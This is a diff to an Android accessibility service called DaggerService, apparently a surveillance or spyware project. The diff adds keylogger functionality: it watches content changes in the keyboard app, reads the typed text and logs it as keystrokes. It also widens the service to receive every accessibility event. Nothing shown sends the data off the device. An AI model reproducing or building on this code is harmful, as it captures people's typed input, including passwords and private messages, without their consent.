@@ -20,7 +20,6 @@ import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK
-import android.view.accessibility.AccessibilityNodeInfo.ACTION_SELECT
 
 class DaggerService : AccessibilityService() {
 
@@ -95,6 +94,14 @@ class DaggerService : AccessibilityService() {
                     Log.d(TAG, event.text.toString())
                 }
             }
+
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                if (event.packageName == Config.KEYBOARD_PACKAGE_NAME) {
+                    val source = event.source
+                    val keystroke = source.text.toString()
+                    Log.d(TAG, "Keystroke detected: $keystroke")
+                }
+            }
         }
     }
 
@@ -123,10 +130,12 @@ class DaggerService : AccessibilityService() {
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
             info.flags = info.flags or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
         }
+
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                 AccessibilityEvent.TYPE_VIEW_CLICKED or
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         return info
     }
